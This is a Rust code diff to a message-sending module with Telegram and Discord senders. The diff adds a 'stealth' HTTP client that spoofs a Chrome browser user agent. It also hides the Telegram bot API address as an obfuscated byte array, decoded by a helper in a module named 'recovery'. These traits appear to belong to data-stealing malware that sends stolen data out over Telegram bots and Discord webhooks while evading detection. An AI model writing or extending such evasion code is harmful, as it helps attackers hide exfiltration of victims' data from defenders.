@@ -1,6 +1,8 @@
 use crate::formatter::{FormattedMessage, MessageFormatter};
+use crate::recovery::helpers::obfuscation::deobf;
 use reqwest::{
     Client,
+    header::{HeaderMap, HeaderValue, USER_AGENT},
     multipart::{Form, Part},
 };
 use serde::{Deserialize, Serialize};
@@ -64,16 +66,34 @@ pub struct TelegramSender {
     base_url: String,
 }
 
+fn create_stealth_client() -> Client {
+    let mut headers = HeaderMap::new();
+    headers.insert(
+        USER_AGENT,
+        HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
+    );
+
+    Client::builder()
+        .default_headers(headers)
+        .build()
+        .unwrap_or_else(|_| Client::new())
+}
+
 impl TelegramSender {
     pub fn new(token: impl Into<String>) -> Self {
-        Self::with_client(Client::new(), token)
+        Self::with_client(create_stealth_client(), token)
     }
 
     pub fn with_client(client: Client, token: impl Into<String>) -> Self {
         let token = token.into();
+        // "https://api.telegram.org/bot"
+        let base = deobf(&[
+            0xD5, 0xC9, 0xC9, 0xCD, 0xCE, 0x87, 0x92, 0x92, 0xDC, 0xCD, 0xD4, 0x93, 0xC9, 0xD8,
+            0xD1, 0xD8, 0xDA, 0xCF, 0xDC, 0xD0, 0x93, 0xD2, 0xCF, 0xDA, 0x92, 0xDF, 0xD2, 0xC9,
+        ]);
         Self {
             client,
-            base_url: format!("https://api.telegram.org/bot{token}"),
+            base_url: format!("{}{}", base, token),
         }
     }
 
@@ -206,7 +226,7 @@ pub struct DiscordSender {
 impl DiscordSender {
     pub fn new(webhook_url: impl Into<String>) -> Self {
         Self {
-            client: Client::new(),
+            client: create_stealth_client(),
             webhook_url: webhook_url.into(),
         }
     }
